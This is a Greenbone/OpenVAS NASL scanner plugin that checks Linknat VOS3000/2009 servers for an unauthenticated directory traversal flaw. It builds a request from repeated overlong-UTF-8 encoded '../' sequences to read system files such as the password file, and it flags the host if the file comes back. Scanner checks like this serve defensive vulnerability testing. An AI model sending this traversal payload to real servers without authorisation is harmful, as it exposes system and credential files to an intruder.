CPE = "cpe:/a:linknat:vos";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.106088" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2016-05-27 12:47:53 +0700 (Fri, 27 May 2016)" );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:N/A:N" );
	script_tag( name: "qod_type", value: "remote_active" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "Linknat VOS3000/2009 Directory Traversal Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2016 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_linknat_vos_detect_http.sc", "os_detection.sc" );
	script_mandatory_keys( "linknat_vos/detected" );
	script_tag( name: "summary", value: "Linknat VOS3000/2009 is prone to a directory traversal vulnerability" );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP GET request and checks the response." );
	script_tag( name: "insight", value: "A directory traversal vulnerability has been found where unicode
encoded characters are not properly validated." );
	script_tag( name: "impact", value: "A unauthenticated remote attacker can read arbitrary system files." );
	script_tag( name: "affected", value: "Version 2.1.1.5, 2.1.1.8 and 2.1.2.0" );
	script_tag( name: "solution", value: "Upgrade to version 2.1.2.4 or later" );
	script_xref( name: "URL", value: "http://www.wooyun.org/bugs/wooyun-2010-0145458" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
port = get_app_port( cpe: CPE, service: "www" );
if(!port){
	exit( 0 );
}
files = traversal_files( "linux" );
for file in keys( files ) {
	url = "/" + crap( data: "%c0%ae%c0%ae/", length: 13 * 8 ) + files[file];
	if(http_vuln_check( port: port, url: url, pattern: file )){
		security_message( port: port );
		exit( 0 );
	}
}
exit( 0 );

